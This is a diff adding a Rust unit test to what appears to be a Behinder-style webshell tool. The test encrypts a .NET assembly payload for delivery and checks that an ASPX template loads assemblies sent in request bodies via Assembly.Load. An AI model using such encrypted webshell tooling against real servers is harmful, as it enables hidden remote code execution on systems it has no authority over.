@@ -807,6 +807,35 @@ mod jsp_behinder_tests {
     }
 
     #[test]
+    fn dotnet_behinder_wraps_assembly_bytes() {
+        let md5_key = derive_md5_key("dn-key");
+        // A PE-like assembly blob.
+        let assembly: Vec<u8> = [0x4du8, 0x5a, 0x90, 0x00]
+            .iter()
+            .copied()
+            .chain([0u8; 60])
+            .collect();
+        let payload = crate::runtime::DotnetAssemblyPayload {
+            assembly_bytes: assembly.clone(),
+            entry_class: "Entry".into(),
+        };
+        let body = payload.wrap(&md5_key);
+        assert!(
+            !body.contains('M') || !body.starts_with("MZ"),
+            "wire body is ciphertext"
+        );
+        // Roundtrip: decode the endpoint's decrypt path.
+        let decoded = b64_decode(&body).unwrap();
+        let plain = stream_cipher(&decoded, &md5_key);
+        assert_eq!(plain, assembly);
+        let template = crate::runtime::aspx_behinder_template(&md5_key);
+        assert!(template.contains("Assembly.Load"));
+        assert!(template.contains("CreateInstance"));
+        assert!(template.contains("StreamReader(Request.InputStream)"));
+        assert!(!template.contains("system("));
+    }
+
+    #[test]
     fn behinder_face_wraps_class_bytes_as_body() {
         let md5_key = derive_md5_key("behinder-key");
         let channel = BehinderChannel {
